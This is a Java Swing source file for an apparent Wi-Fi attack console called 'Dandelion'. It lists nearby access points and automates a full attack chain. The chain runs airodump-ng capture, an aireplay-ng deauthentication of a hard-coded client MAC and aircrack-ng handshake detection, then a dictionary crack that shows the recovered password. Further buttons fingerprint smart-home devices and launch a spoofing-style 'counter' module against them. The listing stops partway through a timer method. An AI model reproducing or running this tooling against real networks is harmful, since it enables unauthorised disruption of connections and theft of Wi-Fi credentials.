package GUI;

import java.awt.Dimension;
import java.awt.EventQueue;
import java.awt.Font;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.IOException;
import java.io.InputStream;
import java.lang.invoke.VolatileCallSite;
import java.util.ArrayList;
import java.util.List;
import java.util.Properties;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.BrokenBarrierException;
import java.util.concurrent.CyclicBarrier;

import javax.swing.JButton;
import javax.swing.JComponent;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.JTextPane;
import javax.swing.table.DefaultTableCellRenderer;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableModel;
import javax.swing.text.BadLocationException;
import javax.swing.text.SimpleAttributeSet;

import Manager.Manager_cheatServiceAndHost_5;
import Model.Device_model;
import Model.MyKeyAdapter;
import Model.Mytable;
import Model.Routing_model;
import Util.Recognation.Recognation_device;
import Util.Shell.CloseThread;
import Util.Shell.ReadShell;
import Util.Shell.ShellThread;
import Util.Timer.ShowDeviceOnTable01;
import Util.Timer.TimerCounterDialog;
import Util.Timer.TimerDialog;

public class Interface {

	private JFrame frmAutocountersystem;
	private JTable table;
	private JTextPane begin_text;
	private JScrollPane scrollPane_APtable;
	private int step = 1;
	
	
	//按键button
	private JButton begin_bt;
	private JButton recognation_bt;
	private JButton counter_bt;
	private JButton Recover_bt;
	private JButton password_bt;
	private JButton exit_bt;
	
	//需要获取焦点的components集合
	private List<JComponent> components = new ArrayList<JComponent>();
	
	//装载所有扫描出来的路由设备
	private List<Routing_model> routings;
	
	//pw thred related flag
	volatile boolean pwdFlag = true;
	volatile int capIndex =1;
	
	//properties参数
	String ScanAP_CSV_path = null;
	String SHRLL_PATH = null;
	int COUNTER_TYPE = 0;
	int SCAN_TIMES=0;
	
	
	//自定义工具
	final MyKeyAdapter mk = new MyKeyAdapter(components);
	
	private int selectRouterFlag;
	
	{
		//读取配置文件
		readProperties();
		
	}
	
	/**
	 * Launch the application.
	 */
	public static void main(String[] args) {
		EventQueue.invokeLater(new Runnable() {
			public void run() {
				try {
					Interface window = new Interface();
					window.frmAutocountersystem.setVisible(true);
					//window.frmAutocountersystem.requestFocus();
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});
	}

	/**
	 * Create the application.
	 */
	public Interface() {
		
		
		initialize();
		//添加组件
		components.add(begin_bt);
		components.add(recognation_bt);
		components.add(counter_bt);
		components.add(Recover_bt);
		components.add(password_bt);
		components.add(exit_bt);
		//components.add(scrollPane_APtable);
		
		begin_bt.requestFocus();
	}

	/**
	 * Initialize the contents of the frame.
	 */
	private void initialize() {
		
		//final MyKeyAdapter mk = new MyKeyAdapter(components);
		
		frmAutocountersystem = new JFrame();
		//frmAutocountersystem.setAlwaysOnTop(true);
		frmAutocountersystem.addKeyListener(mk);
		
		frmAutocountersystem.setTitle("Dandelion"); 
		//测试屏幕大小
		
		Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize(); //得到屏幕的尺寸 
		int width = (int)screenSize.getWidth();
		int height = (int)screenSize.getHeight();

		//frmAutocountersystem.setBounds(100, 100, 480, 320);
		
		frmAutocountersystem.setBounds(0, 0, width, height);

		
		frmAutocountersystem.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		frmAutocountersystem.getContentPane().setLayout(null);
		
		//JPanel jp = (JPanel) frmAutocountersystem.getContentPane();
		
		//jp.getInputMap().put(KeyStroke.getKeyStroke('b'), "comfirm");
		  
		scrollPane_APtable = new JScrollPane();
		
		scrollPane_APtable.setBounds(10, 60, 335*(width/480), 293*(height/320));
		frmAutocountersystem.getContentPane().add(scrollPane_APtable);
		
		begin_text = new JTextPane();
		begin_text.setEditable(false);
		
		
		
		
		/*************************************************
		 * 初始化按钮
		 *************************************************/
		begin_bt = new JButton("Init");
		
		begin_bt.setFont(new Font("Arial", Font.PLAIN, 10*(width/480)));
		
		begin_bt.addKeyListener(mk);
		//begin_bt.setMnemonic('m');
		begin_bt.addActionListener(new ActionListener() {
			
			@Override
			public void actionPerformed(ActionEvent e) {
				
				// TODO Auto-generated method stub
				step = 2;
				//显示提示
				//setBinginText();
				
				//显示table
				if(table!=null){
					
					StringBuffer alerting = new StringBuffer();
					
					alerting.append("You have already init system ! \n");
					alerting.append("--Meke sure to re_init--");
					Object[] options ={ "Yes", "Cancal" };  
					
						JOptionPane jo = new JOptionPane();
						jo.addKeyListener(mk);
						int m = JOptionPane.showOptionDialog(frmAutocountersystem, alerting, "Alerting",
								JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE, null, options, options[0]);
						if(m==0){
							/*table = getTable(ScanAP_CSV_path);
							mk.setComponent(table);
							table.addKeyListener(mk);
							scrollPane_APtable.setViewportView(table);*/
							
							setBinginText();
						}
					
				}else {
					/*table = getTable(ScanAP_CSV_path);
					mk.setComponent(table);
					table.addKeyListener(mk);
					scrollPane_APtable.setViewportView(table);*/
					
					setBinginText();
				}
				
			
					
			}
		});
		
		
		begin_bt.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent arg0) {
				
					step = 2;	
					//显示提示
					//setBinginText();
					
					//显示table
				//scrollPane_APtable.setViewportView(getTable(ScanAP_CSV_path));
					
			}
		});
		begin_bt.setBounds(355*(width/480), 20*(height/320), 93*(width/480), 23*(height/320));
		frmAutocountersystem.getContentPane().add(begin_bt);
		
		
		
		/*************************************************
		 * 识别按钮
		 *************************************************/
		
		recognation_bt = new JButton("SReg");
		recognation_bt.addKeyListener(mk);
		recognation_bt.setFont(new Font("Arial", Font.PLAIN, 10*(width/480)));
		
		//doclick
		recognation_bt.addActionListener(new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				// TODO Auto-generated method stub
				if(step == 2||step==3){
					step = 3;
			
					//拿到选中的cell中的数据
					int selectRow = table.getSelectedRow();
					int selectColumn = table.getSelectedColumn();
					DefaultTableModel dt = (DefaultTableModel)table.getModel();
					if(selectColumn==0){ 
						
						StringBuffer alerting = new StringBuffer();
						alerting.append("Target | "+dt.getValueAt(selectRow, 0)+"| \n");
						alerting.append("--Yes to start a Recognition--");
						Object[] options ={ "Yes", "Cancal" };  
						
							JOptionPane jo = new JOptionPane();
							jo.addKeyListener(mk);
							int m = JOptionPane.showOptionDialog(frmAutocountersystem, alerting, "Alerting",
									JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE, null, options, options[0]);
							
							if(m==0){
								//1.新的提示窗口
								//2.启动破密,启动一个新的线程来完成
								final Routing_model router = routings.get(selectRow);
								
								selectRouterFlag = selectRow;
								//new TimerDialog().showDialog(frmAutocountersystem, "Please wait ! Devices Analyzing......", 5);
								
								final TimerCounterDialog td = new TimerCounterDialog(); 
								
								final  CyclicBarrier cb_recogniton = new CyclicBarrier(2);
								
								new Thread(new Runnable() {
									
									@Override
									public void run() {
										
										//先抓取指定路由器的数据包，然后启动识别
										final ReadShell r_cmd1 = new ReadShell();
										new Thread(new Runnable() {
											
											@Override
											public void run() {
													
													r_cmd1.readCMD("airodump-ng --bssid "+router.getMac()+
															" -c "+router.getChannel()+
															" -w /home/liu/recognation --output-format cap"+" wlp3s0");
											}
										}).start();
										
										
										//stop capture
										new Thread(new Runnable() {
											
											@Override
											public void run() {
												// TODO Auto-generated method stub
												try {
													Thread.sleep(30000);
												} catch (InterruptedException e) {
													// TODO Auto-generated catch block
													e.printStackTrace();
												}
												
												r_cmd1.destroy();
												
											}
										}).start();
										
										
										//wen jian zhan yong
										//routings = new Recognation_device(routings).getRoutings();
										Recognation_device re = new Recognation_device();
										List<Device_model> devices = re.checkDevice("/home/liu/recognation-01.cap", "/home/liu/output1.csv");
										
										if(devices!=null){
											if(devices.size()>=1){
												routings.get(selectRouterFlag).setDevices(devices);
											}
											
										}
										
										try {
											cb_recogniton.await();
										} catch (InterruptedException
												| BrokenBarrierException e) {
											// TODO Auto-generated catch block
											e.printStackTrace();
										}
										
									}
								}).start();
								
								new Thread(new Runnable() {
									
									@Override
									public void run() {
										
										try {
											cb_recogniton.await();
										} catch (InterruptedException
												| BrokenBarrierException e) {
											// TODO Auto-generated catch block
											e.printStackTrace();
										}
										
										td.close();
										
										Timer timer = new Timer();
										
										ShowDeviceOnTable01 st = new ShowDeviceOnTable01(routings, table, timer,scrollPane_APtable);
										
										timer.schedule(st, 20, 10);
									}
								}).start();
								
								
								td.showDialog(frmAutocountersystem, "Recognation! Please wait...");
							}
						
					}else{
						
						new TimerDialog().showDialog(frmAutocountersystem,"Please choice a given ESSID", 2);
					}
				
				}else{
					new TimerDialog().showDialog(frmAutocountersystem, "NO Target,Please Re_init !", 2);
				}
			}
		});
		
		//mouse
		/*recognation_bt.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent arg0) {
				
				if(step == 2){
					step = 3;
					//提示,自动关闭窗口
					TimerDialog dialog = new TimerDialog();
					dialog.showDialog(frmAutocountersystem, "Devices Analyzing......", 3);
					
					//删除指定的一列
		            //table.removeColumn(table.getColumnModel().getColumn(columnIndex));
					
					//添加新的列
					DefaultTableModel dt = (DefaultTableModel)table.getModel();
	
					Vector<String> reminds = new Vector<String>();
					for(int i = 0;i<dt.getRowCount();i++){	
						reminds.add("Analyzing......");
					}
					dt.addColumn("Home_device",reminds);
	
					
					//设置识别后的内容，逐行更新
					Timer timer = new Timer();
					timer.schedule(new ShowDeviceOnTable(new Recognation_device(routings), table, timer,scrollPane_APtable), 3000, 100);
						
					//重新设置Table格式
					for(int i = 0;i<table.getColumnModel().getColumnCount();i++){
						
						if(i<4){
							table.getColumnModel().getColumn(i).setPreferredWidth(60);
							table.getColumnModel().getColumn(i).setMinWidth(27);  
							table.getColumnModel().getColumn(i).setMaxWidth(600);
							
						}
							else{
							table.getColumnModel().getColumn(i).setPreferredWidth(220);
							table.getColumnModel().getColumn(i).setMinWidth(30);
							table.getColumnModel().getColumn(i).setMaxWidth(500);
						}
						
					}
						
				}
				
				
			}
		});*/
		recognation_bt.setBounds(355*(width/480), 60*(height/320), 93*(width/480), 23*(height/320));
		frmAutocountersystem.getContentPane().add(recognation_bt);
		
		
		
		/*************************************************
		 * 破密按钮
		 *************************************************/
		password_bt = new JButton("PWCrack");
		password_bt.setBounds(355*(width/480), 250*(height/320), 93*(width/480), 23*(height/320));
		frmAutocountersystem.getContentPane().add(password_bt);
		password_bt.addKeyListener(mk);
		password_bt.setFont(new Font("Arial", Font.PLAIN, 10*(width/480)));
		
		//doclick
		password_bt.addActionListener(new ActionListener() {
			
			@Override
			public void actionPerformed(ActionEvent e) {
				// TODO Auto-generated method stub
				
				//step==2||step==3
				if(step==2||step==3){
					
					//拿到选中的cell中的数据
					int selectRow = table.getSelectedRow();
					int selectColumn = table.getSelectedColumn();
					DefaultTableModel dt = (DefaultTableModel)table.getModel();
					if(selectColumn==0){ 
						
						StringBuffer alerting = new StringBuffer();
						alerting.append("Target | "+dt.getValueAt(selectRow, 0)+"| \n");
						alerting.append("--Yes to start a PWD_Crack--");
						Object[] options ={ "Yes", "Cancel" };  
						
							JOptionPane jo = new JOptionPane();
							jo.addKeyListener(mk);
							int m = JOptionPane.showOptionDialog(frmAutocountersystem, alerting, "Alerting",
									JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE, null, options, options[0]);
							
							if(m==0){
								//1.新的提示窗口
								//2.启动破密,启动一个新的线程来完成
								Routing_model router = routings.get(selectRow);
								
								/*String[] text = new String[]{"|-----Cracking PassWord!-----|","This is a time_consuming task","You'd wait it success or cancal !"
										,"|----Target----| "+router.getName()+" | "+router.getChannel()+" | "+router.getPrivacy()};
								set_newText(scrollPane_APtable, text);*/
								
									
								//int i = JOptionPane.showConfirmDialog(frmAutocountersystem,alerting1,"Please wait !",JOptionPane.CANCEL_OPTION);
								
								//JOptionPane.showMessageDialog(frmAutocountersystem, alerting1, "Please wait!",1);
								/*StringBuffer alerting1 = new StringBuffer();
								alerting1.append("Target | "+router.getName()+"| \n");
								alerting1.append("--PWD_Crack is running--");
								alerting1.append("--Cancel to halt PWCrack !--");
								
								Object[] options1 ={"Cancel"};  
								
								int m1 = JOptionPane.showOptionDialog(frmAutocountersystem, alerting1, "Please wait !",
											JOptionPane.CANCEL_OPTION, JOptionPane.WARNING_MESSAGE, null, options1, options1[0]);*/
								//破密
								crack_pwd_thread(router);

							}
						
					}else{
						
						new TimerDialog().showDialog(frmAutocountersystem,"Please choice a given ESSID", 2);
					}
				}else{
					
					new TimerDialog().showDialog(frmAutocountersystem, "NO Target,Please Re_init !", 2);
				}
					
			}
		});
		
		
		//mouse
		/*password_bt.addMouseListener(new MouseAdapter() {

			@Override
			public void mouseClicked(MouseEvent e) {
				
				
							//鼠标点击，测试所用
				
							Routing_model router = new Routing_model();
							router.setMac("");
							router.setName("");
							router.setChannel("");
							
							String[] text = new String[]{"|-----Cracking PassWord!-----|","This is a time_consuming task","You'd wait it success or cancal !"
									,"|----Target----| "+router.getName()+" | "+router.getChannel()+" | "+router.getPrivacy()};
							set_newText(scrollPane_APtable, text);
							
							
							//破密
							crack_pwd_thread(router);
			}
			
		});*/

		
		/*************************************************
		 * 反制按钮
		 *************************************************/
		
		counter_bt = new JButton("ACrack");
		counter_bt.addKeyListener(mk);
		counter_bt.setFont(new Font("Arial", Font.PLAIN, 10*(width/480)));
		
		//doclick
		counter_bt.addActionListener(new ActionListener() {
			
			@Override
			public void actionPerformed(ActionEvent e) {
				// TODO Auto-generated method stub

				if(step == 3){
					if(table.getColumnCount()>=5){
						
						//拿到选中的cell中的数据
						int selectRow = table.getSelectedRow();
						int selectColumn = table.getSelectedColumn();
						DefaultTableModel dt = (DefaultTableModel)table.getModel();
						if(selectColumn>=4){
							
							StringBuffer alerting = new StringBuffer();
							//alerting.append("Target | "+routings.get(selectRow).getName());
							alerting.append("Target | "+dt.getValueAt(selectRow, 0));
							alerting.append(" | "+dt.getValueAt(selectRow, selectColumn)+"\n");
							alerting.append("--Yes to start a Crack--");
							//int i = JOptionPane.showConfirmDialog(frmAutocountersystem,alerting,"Alerting",JOptionPane.YES_NO_OPTION);
							
							Object[] options ={ "Yes", "Cancal" };  
							int m = JOptionPane.showOptionDialog(frmAutocountersystem, alerting, "Alerting",
									JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE, null, options, options[0]);
							
							 //点击确定按钮后， 显示counter_text
							if(m == 0){	 
								 step = 4;
								 //设置一个新的JtextPane来提示
								//String s =(String) dt.getValueAt(selectRow, 0);
								 Routing_model router = null;
								 router = routings.get(selectRouterFlag);
								 
								/*for(Routing_model r:routings){
									
									if(r.getName().equals(s)){
										router = r;
									}
								}*/
								
								if(router!=null){
									
									Device_model device = router.getDevices().get(selectColumn-4);
									/*String[] text= new String[]{"|-------Cracking--------| "+router.getName()+" | "+device.getName(),
																"|****AP MAC****| "+router.getMac(),
																"|****Channel****| "+router.getChannel(),
																"Please wait ......"};
									set_newText(scrollPane_APtable, text);*/
									
									 //选择模式，启动反制
									 if(COUNTER_TYPE == 1){ 
										 
										 //需要传入本地网卡IP，反制设备当前IP，MAC地址
										 
										final Manager_cheatServiceAndHost_5 m5 = new Manager_cheatServiceAndHost_5();
										
										//启动反制
										m5.start(device.getCurrentIP(), device.getCurrentAPIP(), device.getCurrentSerIP(), device.getMac(), router.getMac(),device.getDb_model());
										 
										final TimerCounterDialog td = new TimerCounterDialog();
										
										
										new Thread(new Runnable() {
											
											@Override
											public void run() {
												
												boolean flag = true;
												
												while(flag){
													
													//每5秒检查一下是否反制成功
													try {
														Thread.sleep(3000);
													} catch (InterruptedException e) {
														// TODO Auto-generated catch block
														e.printStackTrace();
													}
													
													if(m5.getCraResultFlag()==2){
														
														
														//关闭反制，以及检测和提示
														flag = false;
														m5.counterOver();
														td.close();
														
														//提示反制成功
														StringBuffer alerting = new StringBuffer();
														alerting.append("    Cracking Success ! \n");
														alerting.append("    OK to continue \n");
														
														Object[] options ={ "OK" };  
														int m = JOptionPane.showOptionDialog(frmAutocountersystem, alerting, "Alerting",
																JOptionPane.CANCEL_OPTION, JOptionPane.INFORMATION_MESSAGE, null, options, options[0]);
													}
													
												}
											}
										}).start();
										
										td.showDialog(frmAutocountersystem, "Cracking device: "+device.getName()+",Please wait !");
										
									 }
									 else if(COUNTER_TYPE == 2){
										//启动抓包，然后把抓取到的数据传到后台
										//new ReadShell().readCMD(""+APmac+APchannel); 
									 }
									 
								}else {
									
									new TimerDialog().showDialog(frmAutocountersystem, "Router info loss,please re_init !", 3);
								}
								
							}
						}
						else{
							
							//没有选择正确的反制设备或者没有识别出智能家居设备
							new TimerDialog().showDialog(frmAutocountersystem, "NO Target,Plese check or restart!", 3);
						}
						
					}
					
				}else{
					new TimerDialog().showDialog(frmAutocountersystem, "NO Target,Please Re_init !", 3);
				}	
			
			}
		});
		
		//mouse
		counter_bt.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent arg0) {
				if(step == 3){
					if(table.getColumnCount()>=5){
						
						//拿到选中的cell中的数据
						int selectRow = table.getSelectedRow();
						int selectColumn = table.getSelectedColumn();
						DefaultTableModel dt = (DefaultTableModel)table.getModel();
						if(selectColumn>=4){
							
							StringBuffer alerting = new StringBuffer();
							alerting.append("Target | "+dt.getValueAt(selectRow, 0));
							alerting.append(" | "+dt.getValueAt(selectRow, selectColumn));
							alerting.append("--Yes to start a Crack--");
							//int i = JOptionPane.showConfirmDialog(frmAutocountersystem,alerting,"Alerting",JOptionPane.YES_NO_OPTION);
							
							Object[] options ={ "Yes", "No" };  
							int m = JOptionPane.showOptionDialog(frmAutocountersystem, alerting, "Alerting",
									JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE, null, options, options[0]);
							
							 //点击确定按钮后， 显示counter_text
							if(m == 0){	 
								 step = 4;
								 //设置一个新的JtextPane来提示
								 //setAfterSelectText_crack(routings.get(selectRow),routings.get(selectRow).getDevices().get(selectColumn-4));
								 //启动抓指定的数据包
								 String APmac = routings.get(selectRow).getMac();
								 String APchannel = routings.get(selectRow).getChannel();
								 String APname = routings.get(selectRow).getName();
								 
								// Device_model dv = routings.get(selectRow).getDevices().get(selectColumn-4);
								 	 
								 //选择模式，启动反制
								 if(COUNTER_TYPE == 1){ 
									 
									 //需要传入本地网卡IP，反制设备当前IP，MAC地址
									 
									 //切换网卡扫描模式
									
									 //new Manager_cheatServiceAndHost_3().start();
								
								 }
								 else if(COUNTER_TYPE == 2){
									//启动抓包，然后把抓取到的数据传到后台
									//new ReadShell().readCMD(""+APmac+APchannel); 
								 }
							}
						}
						
					}
					
				}	
			}
		});
		counter_bt.setBounds(355*(width/480), 100*(height/320), 93*(width/480), 23*(height/320));
		frmAutocountersystem.getContentPane().add(counter_bt);
		
		
		/*************************************************
		 * 退出按钮
		 *************************************************/
		exit_bt = new JButton("EXIT");
		exit_bt.addKeyListener(mk);
		exit_bt.setFont(new Font("Arial", Font.PLAIN, 10*(width/480)));
		//doclick
		exit_bt.addActionListener(new ActionListener() {
			
			@Override
			public void actionPerformed(ActionEvent e) {
				// TODO Auto-generated method stub

				//提示
				TimerDialog dialog = new TimerDialog();
				dialog.showDialog(frmAutocountersystem, "System Exit", 1);
				System.exit(0);
			}
		});
		
		
		//mouse
		exit_bt.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent arg0) {
				//提示
				TimerDialog dialog = new TimerDialog();
				dialog.showDialog(frmAutocountersystem, "System Exit", 1);
				System.exit(0);
			}
		});
		exit_bt.setBounds(355*(width/480), 290*(height/320), 93*(width/480), 23*(height/320));
		frmAutocountersystem.getContentPane().add(exit_bt);
		
		
		/*************************************************
		 * 还原按钮，重置设备到反制之前的状态
		 *************************************************/
		Recover_bt = new JButton("ReStus");
		Recover_bt.setFont(new Font("Arial", Font.PLAIN, 10*(width/480)));
		
		Recover_bt.addKeyListener(mk);
		
		//doclick
		Recover_bt.addActionListener(new ActionListener() {
			
			@Override
			public void actionPerformed(ActionEvent e) {
				//反制还原，必须在反制状态下才能进行，先提示，选择确定后反制还原
				
				if(step==4){
					step=5;
					StringBuffer alerting = new StringBuffer();
					alerting.append(" Cracking will be halted !\n");
					alerting.append(" Sure you are beyond sensors \n");
					alerting.append("--Yes to start a Re_Crack--");
					//int i = JOptionPane.showConfirmDialog(frmAutocountersystem,alerting,"Alerting",JOptionPane.YES_NO_OPTION);
					
					Object[] options ={ "Comfirm", "Cancal" };  
					/*int m = JOptionPane.showOptionDialog(frmAutocountersystem, alerting, "Alerting",
							JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE, null, options, options[0]);*/
					
						JOptionPane jo = new JOptionPane();
						jo.addKeyListener(mk);
						
						int m = JOptionPane.showOptionDialog(frmAutocountersystem, alerting, "Alerting",
								JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE, null, options, options[0]);
					
					if(m==0){
						//再次启动反制  
						
						String[] text = new String[]{"|-------Re_Cracking--------| ","Beyond the sensor range !","Please wait......"};
						set_newText(scrollPane_APtable, text);
						
					}
					
				}
			}
		});
		
		//mouse
		Recover_bt.addMouseListener(new MouseAdapter() {
			@Override
			public void mouseClicked(MouseEvent e) {
				
				//反制还原，必须在反制状态下才能进行，先提示，选择确定后反制还原
				
				if(step==3){
					step=4;
				}
				
				StringBuffer alerting = new StringBuffer();
				alerting.append(" Cracking will be halted !\n");
				alerting.append(" Sure you are beyond sensors \n");
				alerting.append("--Yes to start a Re_Crack--");
				//int i = JOptionPane.showConfirmDialog(frmAutocountersystem,alerting,"Alerting",JOptionPane.YES_NO_OPTION);
				
				Object[] options ={ "Yes", "No" };  
				int m = JOptionPane.showOptionDialog(frmAutocountersystem, alerting, "Alerting",
						JOptionPane.YES_NO_OPTION, JOptionPane.QUESTION_MESSAGE, null, options, options[0]);
				
				if(m==0){
					//再此启动反制  
					//Crack_resultText(scrollPane_APtable);
				}
				
				
				//frmAutocountersystem.requestFocus();
			}
		});
		Recover_bt.setBounds(355*(width/480), 137*(height/320), 93*(width/480), 23*(height/320));
		frmAutocountersystem.getContentPane().add(Recover_bt);
	}
	
	
	
	
	
	/*************************************************
	 * 破密按钮：破密按钮需要一个线程来控制启动Shell
	 *************************************************/
	public void crack_pwd_thread(final Routing_model router){
		
		
		//alerting
		StringBuffer alerting1 = new StringBuffer();
		alerting1.append("Target | "+router.getName()+"| \n");
		alerting1.append("--PWD_Crack is running--");
		alerting1.append("--Cancel to halt PWCrack !--");
		
		Object[] options1 ={"Cancel"};  
		
		
		//end
		final CyclicBarrier cb = new CyclicBarrier(2);
		
		final CyclicBarrier cb1 = new CyclicBarrier(2);
		
		final ReadShell r_cmd1 = new ReadShell();
		
		new Thread(new Runnable() {
			
			@Override
			public void run() {
				// TODO Auto-generated method stub
				
				 //boolean flag =true;
				//while(pwdFlag){
					
					//命令1，一直运行，不能停
					r_cmd1.readCMD("airodump-ng --bssid "+router.getMac()+
							" -c "+router.getChannel()+
							" -w /home/liu/testwifi --output-format cap"+" wlp3s0");
					/*try {
						cb.await();
					} catch (InterruptedException | BrokenBarrierException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}*/
				//}
				
			}
		}).start();
		
		//命令2
		new Thread(new Runnable() {
			@Override
			public void run() {
				// TODO Auto-generated method stub
				ReadShell r = new ReadShell();
				
				//System.out.println("mac:"+router.getMac());
				
				r.readCMD("aireplay-ng -0 1 -a "+router.getMac()+" -c C0:EE:FB:DD:9F:28  "+" wlp3s0");
				
			}
		}).start();
		
		//命令3,判断print1 直到handshake>0,执行命令4
		//每执行该命令一次，就去读取一次标志位
		new Thread(new Runnable() {
			
			@Override
			public void run() {
				// TODO Auto-generated method stub
				
				boolean flag = true;
				List<String> list = null;
				while(flag){
					/*try {
						cb.await();
					} catch (InterruptedException | BrokenBarrierException e) {
						e.printStackTrace();
					}*/
					
					//be sure get the input
					try {
						Thread.sleep(10000);
					} catch (InterruptedException e1) {
						// TODO Auto-generated catch block
						e1.printStackTrace();
					}
					
					
					ReadShell r = new ReadShell();
					list = r.readCMD("aircrack-ng /home/liu/testwifi-0"+capIndex+".cap");
					//capIndex++;
					
					/*for(String string : list){
						
						System.out.println("aaaaaaaaaaaaaaaaaaaa:"+string);
					}*/
					
					String[] ss = null;
					
					if(list.size()>=6){
						 ss = list.get(6).split("handshake");
					}
					
					if(ss.length!=0&&ss[0].length()!=0){
						
						String s = ss[0].trim().substring(ss[0].trim().length()-1, ss[0].trim().length());
						
						int counts = Integer.parseInt(s);
					
						if(counts>0){
							
							System.out.println("handshake ok");
							flag = false;
							r_cmd1.destroy();
							
							try {
								cb1.await();
							} catch (InterruptedException | BrokenBarrierException e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}
							
						}else {
							System.out.println("handshake false");
						}
						
					}
				}
			}
		}).start();
        
        //命令4
		//new Thread(new ShellThread("/home/liu/wifitest0")).start();
		new Thread(new Runnable() {
			@Override
			public void run() {
				// TODO Auto-generated method stub
				
				try {
					cb1.await();
				} catch (InterruptedException | BrokenBarrierException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				ReadShell r = new ReadShell();
				List<String> result = r.readCMD("aircrack-ng -w /home/liu/Six_nums_dict.txt /home/liu/testwifi-0"+capIndex+".cap");
				System.out.println(result.get(18));

				//display
				StringBuffer alerting = new StringBuffer();
				alerting.append(" PWD cracking successed !\n");
				alerting.append(" result :\n");
				alerting.append(result.get(18).trim()+"\n");
				
				//int i = JOptionPane.showConfirmDialog(frmAutocountersystem,alerting,"Alerting",JOptionPane.YES_NO_OPTION);
				
				Object[] options ={ "Comfirm" }; 
				int m = JOptionPane.showOptionDialog(frmAutocountersystem, alerting, "Success!",
						JOptionPane.OK_CANCEL_OPTION, JOptionPane.INFORMATION_MESSAGE, null, options, options[0]);
				
			}
		}).start();

		//alerting
		/*int m1 = JOptionPane.showOptionDialog(frmAutocountersystem, alerting1, "Please wait !",
					JOptionPane.CANCEL_OPTION, JOptionPane.WARNING_MESSAGE, null, options1, options1[0]);*/

	}
	/*************************************************
	 * end
	 ************************************************/
	
	
	/*************************************************
	 * 将给定的语句 显示在一个text在一个JScrollPane中,line
	 * 中为每一行要显示的元素
	 *************************************************/
	public void set_newText(JScrollPane Jcontainer,String[] line){
		
		JTextPane jp = new JTextPane();
		jp.setEditable(false);
		
		//scrollPane_APtable.setViewportView(jp);
		
		Jcontainer.setViewportView(jp);
		//Vector<String> counterText = new Vector<String>();
		if(line.length>0){
			
			jp.setText(line[0]);
			try {
				for(int i =1;i<line.length;i++){
					
					jp.getDocument().insertString(jp.getDocument().getLength(), "\n "+line[i], new SimpleAttributeSet());
				}
			} catch (BadLocationException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			
		}

	}
	
	
	/*************************************************
	 * 改函数设置一个Table个格式,并且返回一个Table
	 *************************************************/
	public JTable getTable(String csvPath){
		
		
		//JTable table = new JTable();
		JTable table = new Mytable();
		table.setModel(getModel());
		table.setCellSelectionEnabled(true);
		table.setAutoResizeMode(JTable.AUTO_RESIZE_OFF);
		
		//设置字体居中
		DefaultTableCellRenderer dc = new DefaultTableCellRenderer();
		dc.setHorizontalAlignment(JLabel.CENTER);
		
		table.setDefaultRenderer(Object.class, dc);
		
		//设置初始行列大小
		for(int i = 0;i<table.getColumnModel().getColumnCount();i++){
				table.getColumnModel().getColumn(i).setPreferredWidth(113);
				table.getColumnModel().getColumn(i).setMinWidth(27);  
				table.getColumnModel().getColumn(i).setMaxWidth(600);
			
		}
		
		//设置table中的值
		//读取CSV中的数据
		 routings = new Routing_model(csvPath).getRoutings(); 
		for(Routing_model routing:routings){
			String[] arr = new String[4];
			arr[0] = routing.getName();
			
			if(arr[0].equals("")||arr[0] == null){    //遗留问题
				arr[0] = "(No Permission)";	
			}
			
			//System.out.println(" |"+arr[0]+"|");
			arr[1] = routing.getChannel();
			arr[2] = routing.getPower();
			arr[3] = routing.getPrivacy();
			
			DefaultTableModel tb = (DefaultTableModel)table.getModel();
			tb.addRow(arr);
			table.invalidate();
			
		}
		
		return table;
	}

	/*************************************************
	 * end
	 *************************************************/

	
	
	
	/*************************************************
	 * 该函数设置一个表格的model格式，并返回一个MODEL
	 *************************************************/
	public TableModel getModel(){
		String[] header = {"ESSID","Channel","Power","Privacy"};
		Object[][] cellData = null;
		DefaultTableModel model = new DefaultTableModel(cellData, header);
			
		return model;
	}
	
	
	
	/*************************************************
	 * 该函数用来设置初始化视图的提示
	 *************************************************/
	public void setBinginText(){
		//Timer timer = new Timer();
		scrollPane_APtable.setViewportView(begin_text);
		begin_text.setText("System initing......");
		List<String> ss = new ArrayList<String>();
		ss.add("Loading resources......");
		ss.add("success");
		ss.add("now system will sniffing AP_router,please wait.......");
		timer2(2000, ss,begin_text);
		
	}
	
	/*************************************************
	 * end
	 *************************************************/
	
	
	/*************************************************
	 * 计时器，第一类
	 *************************************************/
	public  void timer1(final Timer timer,long delay,final int n) {
	    //final Timer timer = new Timer();
		
		
	    timer.schedule(new TimerTask() {
	      public void run() {
	    	/*  try {
	  			begin_text.getDocument().insertString(begin_text.getDocument().getLength(), "\n"+task, new SimpleAttributeSet());
	  		} catch (BadLocationException e) {
	  			e.printStackTrace();
	  		}*/
	    	/*String[] ss= ScanAP_CSV_path.split("?");
	    	
	    	String csv_path = null;
	    	if(ss.length==2){
	    		
	    		StringBuilder sb = new StringBuilder();
	    		sb.append(ss[0]);
	    		sb.append(n);
	    		sb.append(ss[1]);
	    		csv_path = sb.toString();
	    	}else {
				csv_path = ScanAP_CSV_path;
			}*/
